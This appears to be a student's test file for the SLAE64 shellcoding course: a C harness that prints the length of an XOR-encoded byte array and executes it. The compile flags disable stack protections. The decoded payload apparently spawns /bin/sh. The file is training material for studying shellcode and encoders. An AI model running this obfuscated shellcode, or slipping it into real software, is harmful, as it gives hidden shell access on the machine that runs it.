// Student ID   : SLAE64-1611
// Student Name : Jonathan "Chops" Crosby
// Assignment 4 : Shell Code Test File
// File Name    : shellcode.c

#include<stdio.h>
#include<string.h>

//compile with: gcc shellcode.c -o shellcode -fno-stack-protector -z execstack -no-pie

unsigned char code[] = \
"\xeb\x0f\x5f\x8a\x1f\x80\xf3\xff\x74\x0c\x88\x1f\x48\xff\xc7\xeb\xf2\xe8\xec\xff\xff\xff\xb7\xce\x3f\xb7\x7c\x3f\xc4\xb2\xce\x36\xbe\xae\xb7\x44\xd0\xd0\x9d\x96\x91\xd0\x8c\x97\xac\xb7\x76\x18\xbe\xae\xb7\x76\x1d\xa8\xb7\x76\x19\xf0\xfa\xff";

main()
{
	printf("Shellcode Length:  %zu\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
